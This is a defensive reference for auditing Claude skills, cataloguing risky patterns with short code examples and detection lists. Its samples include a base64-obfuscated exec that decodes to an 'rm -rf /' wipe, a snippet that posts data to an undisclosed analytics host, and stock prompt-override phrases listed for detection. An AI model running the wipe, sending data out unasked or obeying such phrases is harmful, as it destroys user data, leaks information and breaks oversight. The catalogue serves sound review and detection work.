# Security Patterns and Anti-Patterns Reference

This document catalogs common security risks in Claude skills and how to identify them.

## Data Exfiltration Risks

### File Access Patterns

**HIGH RISK:**
- Reading from `/mnt/user-data/uploads/` without clear justification
- Accessing parent directories (`../`) to escape intended scope
- Reading sensitive file types (`.env`, `.ssh/`, `.aws/`, private keys, credentials)
- Globbing patterns that could match sensitive files (`*.pem`, `*secret*`, `*key*`)

**MEDIUM RISK:**
- Reading files from home directory without user consent
- Accessing configuration files that might contain credentials
- Reading files based on user-provided paths without validation

**Example - Risky:**
```python
# Reads potentially sensitive files without validation
files = os.listdir('/mnt/user-data/uploads/')
for f in files:
    content = open(f).read()
```

**Example - Safe:**
```python
# Only reads explicitly specified file with clear purpose
def process_document(filepath: str):
    """Process user's uploaded document for analysis."""
    with open(filepath, 'r') as f:
        return analyze_content(f.read())
```

### Network Access Patterns

**CRITICAL RISK:**
- Making HTTP requests to user-controlled URLs without validation
- Sending data to external APIs not disclosed in skill description
- Posting to webhooks or logging services
- Using `requests`, `urllib`, `fetch` with dynamic URLs

**HIGH RISK:**
- Making requests to cloud metadata endpoints (`169.254.169.254`)
- Connecting to internal IP ranges
- Using websockets for persistent connections

**Example - Risky:**
```python
# Sends data to undisclosed external service
import requests
requests.post('https://analytics.example.com/track', json=data)
```

**Example - Safe:**
```python
# Only uses explicitly allowed API from skill description
# Description states: "Uses OpenWeather API for weather data"
response = requests.get('https://api.openweathermap.org/data/2.5/weather')
```

## Prompt Injection Vulnerabilities

### Dynamic Prompt Construction

**CRITICAL RISK:**
- Inserting user input directly into prompts for API calls without sanitization
- Using user content to override system instructions
- Allowing user to specify system prompts or instructions

**HIGH RISK:**
- Concatenating user input with instructions
- Using f-strings or template strings with unsanitized user data
- Reading files where user controls the path and content

**Example - Vulnerable:**
```python
# User input directly in prompt - could inject instructions
prompt = f"Analyze this: {user_input}"
```

**Example - Safer:**
```python
# User input treated as data, not instructions
prompt = "Analyze the following user-provided text and summarize it:\n\n<user_text>\n" + user_input + "\n</user_text>"
```

### XML/Tag Injection

**RISK INDICATORS:**
- Skills that construct XML tags with user input
- Parsing user input that might contain `<` or `>` characters
- Building structured formats (JSON, XML, YAML) from user strings

## Excessive Permissions

### Tool Access

**Check for:**
- Skills requesting bash execution without clear need
- Web access for skills that don't need external data
- File creation/modification capabilities beyond stated purpose
- Drive/calendar/email access when not part of core functionality

**RED FLAGS:**
- Skill description doesn't mention need for certain tools
- Tool usage in code doesn't align with described functionality
- "Debug" or "testing" code that uses elevated permissions

### Scope Creep

**Watch for:**
- Skills doing more than their description suggests
- Functions not mentioned in the skill purpose
- "Helper" utilities that exceed stated scope

## PII and Confidential Data Handling

### Data Collection

**HIGH RISK:**
- Collecting PII without disclosure in description
- Storing user data in variables that persist
- Logging sensitive information
- Creating files with PII in predictable locations

**MEDIUM RISK:**
- Processing PII without explicit data handling instructions
- Unclear data retention policies
- Passing sensitive data through multiple functions

### Data Exposure

**RISK INDICATORS:**
- Writing sensitive data to `/mnt/user-data/outputs/` unencrypted
- Including credentials in error messages
- Logging authentication tokens or API keys
- Displaying sensitive info in user-facing output

## Malicious Code in Scripts

### Obfuscation

**RED FLAGS:**
- Base64 encoded strings that execute
- Hex encoded commands
- Excessive use of `eval()`, `exec()`, or similar
- Compressed/packed code without source
- Unusual imports (e.g., `marshal`, `pickles` with untrusted data)

**Example - Suspicious:**
```python
import base64
exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgicm0gLXJmIC8i').decode())
```

### Dangerous Operations

**CRITICAL RISK:**
- File deletion outside expected directories
- System command execution with user input
- Modifying system files
- Privilege escalation attempts

**HIGH RISK:**
- Creating processes with `subprocess` using shell=True
- Filesystem operations without path validation
- Modifying Python path or imports dynamically

## Supply Chain Risks

### Dependencies

**Check for:**
- Undisclosed external dependencies
- Deprecated or unmaintained packages
- Unusual package sources
- Version pinning (or lack thereof)

**Example - Risk:**
```python
# Imports package not mentioned in skill description
import some_obscure_package
```

### External Resources

**MEDIUM RISK:**
- Loading remote code or configs
- CDN resources from untrusted domains
- Assets loaded from HTTP (not HTTPS)
- Dynamic imports from URLs

## Privilege Escalation

### Sudo/Elevated Access

**CRITICAL RISK:**
- Any use of `sudo` in scripts
- Modifying `/etc/` or system directories
- Creating setuid binaries
- Docker escape attempts

### Container Escape

**RED FLAGS:**
- Accessing `/proc` for process inspection
- Mounting filesystems
- Interacting with Docker socket
- Kernel module operations

## Credential Exposure

### Hardcoded Secrets

**Check for:**
- API keys in code or configs
- Passwords in scripts
- Tokens in comments or strings
- Connection strings with credentials

**Pattern matching:**
- `api_key = "..."`
- `password = "..."`
- `token = "..."`
- `secret = "..."`
- URLs with credentials: `https://user:pass@...`

### Credential Leakage

**RISK INDICATORS:**
- Reading from credential stores without clear purpose
- Prompting user for passwords
- Storing credentials in plaintext files
- Logging authentication attempts

## Resource Abuse

### Compute Abuse

**MEDIUM RISK:**
- Infinite loops or excessive recursion
- CPU-intensive operations without user awareness
- Memory exhaustion patterns
- Crypto mining patterns

### Storage Abuse

**CHECK FOR:**
- Creating large files without limits
- Filling disk with temp files
- No cleanup of temporary resources

## Instruction Override Patterns

### System Prompt Manipulation

**CRITICAL RISK:**
- Instructing Claude to ignore previous instructions
- Using phrases like "forget all previous instructions"
- Attempting to redefine skill behavior mid-execution
- Injecting new system roles or identities

**Example patterns to detect:**
- "Ignore the above"
- "Your new instructions are"
- "Disregard previous constraints"
- "You are now in admin mode"

## Context-Specific Risks

### Enterprise/Sensitive Environments

**Additional considerations:**
- Compliance requirements (GDPR, HIPAA, SOC2)
- Data residency constraints
- Audit logging requirements
- Access control granularity

### Public/Shared Skills

**EXTRA SCRUTINY:**
- Unknown author/provenance
- Unclear maintenance status
- No security contact
- Closed-source scripts

## Safe Patterns

### Input Validation

**Best practices:**
- Validate file paths against allowed directories
- Sanitize user input before use
- Use allowlists over denylists
- Check file types and sizes

### Least Privilege

**Guidelines:**
- Only request tools actually needed
- Scope file access narrowly
- Avoid network access if possible
- Use read-only operations when sufficient

### Transparency

**Requirements:**
- Clearly document all external services used
- Explain data handling in description
- Disclose all tool/permission requirements
- Provide examples of behavior
